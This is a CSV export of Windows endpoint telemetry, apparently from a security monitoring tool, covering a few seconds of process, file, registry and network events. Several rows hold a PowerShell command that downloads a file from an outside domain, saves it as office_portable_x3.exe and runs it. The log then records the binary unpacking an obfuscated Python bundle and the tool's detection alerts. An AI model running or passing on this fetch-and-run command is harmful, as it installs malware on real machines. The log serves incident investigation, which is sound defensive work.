"@timestamp","process.parent.executable","process.parent.command_line","process.executable","process.command_line","process.pid","file.path","Target.process.executable","Target.process.pid","source.ip","destination.ip","dns.question.name","dll.path","registry.path","event.action"
"Jun 1, 2026 @ 14:22:45.750","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\sqlite3.dll","-",load
"Jun 1, 2026 @ 14:22:46.005","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:46.066","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","-","HKLM\SYSTEM\ControlSet001\Control\SystemInformation\SystemManufacturer",query
"Jun 1, 2026 @ 14:22:46.147","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","C:\Windows\System32\DriverStore\FileRepository\nvdm.inf_amd64_c73643c8a6190037\nvinitx.dll","-",load
"Jun 1, 2026 @ 14:22:46.253","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass",modification
"Jun 1, 2026 @ 14:22:46.253","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName",modification
"Jun 1, 2026 @ 14:22:46.254","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet",modification
"Jun 1, 2026 @ 14:22:46.254","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect",modification
"Jun 1, 2026 @ 14:22:46.266","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","config.teams.microsoft.com","-","-","lookup_requested"
"Jun 1, 2026 @ 14:22:46.776","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","config.teams.microsoft.com","-","-","lookup_result"
"Jun 1, 2026 @ 14:22:46.925","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","173.10.254.170","52.123.128.14","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:47.481","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","ctldl.windowsupdate.com","-","-","lookup_requested"
"Jun 1, 2026 @ 14:22:47.781","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","-","-","ctldl.windowsupdate.com","-","-","lookup_result"
"Jun 1, 2026 @ 14:22:48.219","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","173.10.254.170","103.243.115.105","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:48.400","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","173.10.254.170","103.243.115.105","-","-","-","disconnect_received"
"Jun 1, 2026 @ 14:22:49.011","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","C:\Users\DELL\AppData\Local\Temp\mat-debug-11132.log","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:49.026","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","C:\Users\DELL\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\Logs\MSTeamsBackgroundEcs_2026-06-01_14-22-46.244.log","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:49.041","C:\Windows\System32\svchost.exe","C:\Windows\system32\svchost.exe -k DcomLaunch -p","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","""C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe"" -RegisterComServerForEcsTask -Embedding","11,132","-","-","-","-","-","-","-","-",end
"Jun 1, 2026 @ 14:22:49.042","-","-","C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe","-","11,132","-","-","-","173.10.254.170","52.123.128.14","-","-","-","disconnect_received"
"Jun 1, 2026 @ 14:22:49.267","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:49.968","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertinformation.temp.ini","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:49.976","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.backup.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:49.977","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:50.413","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:50.694","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --profile-directory=Default","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --pdf-upsell-enabled --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--ms-user-locale=en_IN --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=73 --time-ticks-at-unix-epoch=-1779939186689345 --launch-time-ticks=364784018312 --ssd-no-pressure-read-main-dll --metrics-shmem-handle=9484,i,286190346284915330,8293634388947469410,2097152 --field-trial-handle=2116,i,15119116069231255934,7446286147424312474,262144 --variations-seed-version --pseudonymization-salt-handle=2136,i,17238159950878766822,16271104688918014547,4 --trace-process-track-uuid=3190709054715926471 --mojo-platform-channel-handle=9864 /prefetch:1","19,832","-","-","-","-","-","-","-","-",start
"Jun 1, 2026 @ 14:22:50.992","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:51.463","-","-","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","-","23,236","C:\Users\SARTHA~1\AppData\Local\Temp\c382d360-2567-4911-8120-2260c0afdbe8.tmp","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:52.228","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:52.761","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertinformation.temp.ini","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:52.781","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.backup.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:52.784","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:53.223","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:54.243","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:54.643","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\office_portable_x3.exe","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:54.686","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pae3498d9#\89d9ebe3566909f62855a4173c11f901\Microsoft.PowerShell.Commands.Management.ni.dll","-",load
"Jun 1, 2026 @ 14:22:55.182","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.M870d558a#\199f66bc1a6fe937deb9e320cbcaacd7\Microsoft.Management.Infrastructure.Native.ni.dll","-",load
"Jun 1, 2026 @ 14:22:55.195","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_5vbnvlbw.fig.ps1","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:55.201","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ncck5xkd.k2e.psm1","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:55.208","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_5vbnvlbw.fig.ps1","-","-","-","-","-","-","-",deletion
"Jun 1, 2026 @ 14:22:55.212","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ncck5xkd.k2e.psm1","-","-","-","-","-","-","-",deletion
"Jun 1, 2026 @ 14:22:55.234","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass",modification
"Jun 1, 2026 @ 14:22:55.239","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName",modification
"Jun 1, 2026 @ 14:22:55.242","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet",modification
"Jun 1, 2026 @ 14:22:55.246","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","-","HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect",modification
"Jun 1, 2026 @ 14:22:55.435","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:55.495","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertinformation.temp.ini","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:55.502","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.backup.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:55.503","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:55.530","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:55.612","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:55.868","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.S1bc92e04#\5466659da0e3579f5794b799726a3d36\Microsoft.SecureBoot.Commands.ni.dll","-",load
"Jun 1, 2026 @ 14:22:56.022","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.W2ded559f#\5cd0d200cf29c223e4e437d194f67470\Microsoft.WindowsAuthenticationProtocols.Commands.ni.dll","-",load
"Jun 1, 2026 @ 14:22:56.643","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","-","-","-","C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Wcffedcb4#\95f1d8e068fd6afe39149113494c63a1\Microsoft.WindowsSearch.Commands.ni.dll","-",load
"Jun 1, 2026 @ 14:22:56.740","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:56.818","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertinformation.temp.ini","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:56.825","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.backup.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:56.826","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:56.857","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:56.885","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","9,916","-","-","-","-","-","-","-","-",start
"Jun 1, 2026 @ 14:22:56.929","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:57.532","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","9,916","-","-","-","-","-","-","-","-","rule_detection"
"Jun 1, 2026 @ 14:22:57.816","C:\Windows\System32\services.exe","(blank)","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc","37,196","-","-","-","-","-","-","-","-",end
"Jun 1, 2026 @ 14:22:58.072","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:58.170","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertinformation.temp.ini","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.179","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.backup.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:58.181","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","C:\Users\DELL\AppData\Local\Microsoft\OneDrive\settings\Personal\assertInformation.ini","-","-","-","-","-","-","-",rename
"Jun 1, 2026 @ 14:22:58.252","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:58.332","-","-","C:\Program Files\Microsoft OneDrive\OneDrive.exe","-","35,608","-","-","-","173.10.254.170","150.171.22.11","-","-","-","connection_attempted"
"Jun 1, 2026 @ 14:22:58.472","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive","-","-","-","-","-","-","-",overwrite
"Jun 1, 2026 @ 14:22:58.474","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","1,860","-","-","-","173.10.254.170","217.160.0.149","-","-","-","disconnect_received"
"Jun 1, 2026 @ 14:22:58.479","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.481","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140_1.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.483","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_bz2.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.483","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""","1,860","-","-","-","-","-","-","-","-",end
"Jun 1, 2026 @ 14:22:58.487","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.494","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_decimal.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.496","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.499","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_lzma.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.502","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.503","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_uuid.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.505","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\_wmi.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.510","C:\Windows\System32\svchost.exe","C:\Windows\system32\svchost.exe -k DcomLaunch -p","C:\Windows\System32\RuntimeBroker.exe","C:\Windows\System32\RuntimeBroker.exe -Embedding","37,120","-","-","-","-","-","-","-","-",end
"Jun 1, 2026 @ 14:22:58.516","C:\Windows\System32\svchost.exe","C:\Windows\system32\svchost.exe -k DcomLaunch -p","C:\Windows\System32\RuntimeBroker.exe","C:\Windows\System32\RuntimeBroker.exe -Embedding","25,864","-","-","-","-","-","-","-","-",end
"Jun 1, 2026 @ 14:22:58.527","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\base_library.zip","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.536","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\campus.py","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.538","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.541","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.543","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_d.js","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.545","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_n.js","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.569","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002a.txt","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.572","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002w.txt","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.573","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.683","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\uusd.exe","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.735","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\libcrypto-3.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.737","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\libffi-8.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.739","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\psutil\_psutil_windows.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.748","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\pyarmor_runtime_000000\pyarmor_runtime.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.750","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.825","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.828","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.837","-","-","C:\Users\DELL\office_portable_x3.exe","-","9,916","C:\Users\DELL\AppData\Local\Temp\_MEI99162\unicodedata.pyd","-","-","-","-","-","-","-",creation
"Jun 1, 2026 @ 14:22:58.838","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","22,348","-","-","-","-","-","-","-","-",start
"Jun 1, 2026 @ 14:22:58.852","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","C:\Users\DELL\office_portable_x3.exe","""C:\Users\DELL\office_portable_x3.exe"" ","22,348","-","-","-","-","-","-","-","-","rule_detection"
"Jun 1, 2026 @ 14:22:59.120","-","-","C:\Users\DELL\office_portable_x3.exe","-","22,348","-","-","-","-","-","-","C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll","-",load
"Jun 1, 2026 @ 14:22:59.191","-","-","C:\Users\DELL\office_portable_x3.exe","-","22,348","-","-","-","-","-","-","C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll","-",load
